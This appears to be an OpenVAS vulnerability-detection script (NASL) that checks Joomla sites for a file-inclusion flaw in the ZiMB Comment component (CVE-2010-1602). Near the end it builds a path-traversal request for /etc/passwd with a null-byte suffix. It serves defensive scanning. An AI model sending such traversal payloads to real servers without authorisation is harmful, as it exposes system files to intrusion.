###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_zimbcomment_mult_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# ZiMB Comment Joomla! Component 'controller' Parameter Multiple Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.804022";
CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2010-1602");
  script_bugtraq_id(39548);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-09-30 20:15:21 +0530 (Mon, 30 Sep 2013)");
  script_name("ZiMB Comment Joomla! Component 'controller' Parameter Multiple Vulnerabilities");

  tag_summary =
"This host is installed with ZiMB Comment Joomla! Component and is prone to
multiple vulnerabilities.";

  tag_vuldetect =
"Send a crafted HTTP GET request and check whether it is able to disclose
information or not.";

  tag_insight =
"Input passed via the 'controller' parameter is not properly sanitised
before being used in the code.";

  tag_impact =
"Successful exploitation will allow remote attackers to disclose the contents
of any file on the system accessible by the web server.

Impact Level: Application";

  tag_affected =
"Joomla Component ZiMB Comment version 0.8.1, Other versions may also be affected.";

  tag_solution =
"No solution or patch is available as of 30th September, 2013. Information
regarding this issue will be updated once the solution details are available.
For Updated refer to http://extensions.joomla.org";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "impact" , value : tag_impact);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://osvdb.org/64247");
  script_xref(name : "URL" , value : "http://www.iedb.ir/exploits-611.html");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/12283");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/88626");
  script_summary("Check if Joomla Component ZiMB Comment is prone to information disclosure");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_mandatory_keys("joomla/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
http_port = 0;
dir = "";
url = "";

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  http_port = 80;
}

## Check the port status
if(!get_port_state(http_port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:http_port)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:http_port)){
  exit(0);
}

## Construct attack request
url = string(dir, "/index.php?option=com_zimbcomment&controller=",
                    "../../../../../../../../../../etc/passwd%00");

## Extra check is not possible
if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
                   pattern:"<b>Fatal error</b>:  require_once"+
                            "\(\): Failed opening required .*"+
                            "/com_zimbcomment/zimbcomment.php"))
{
  security_hole(http_port);
  exit(0);
}
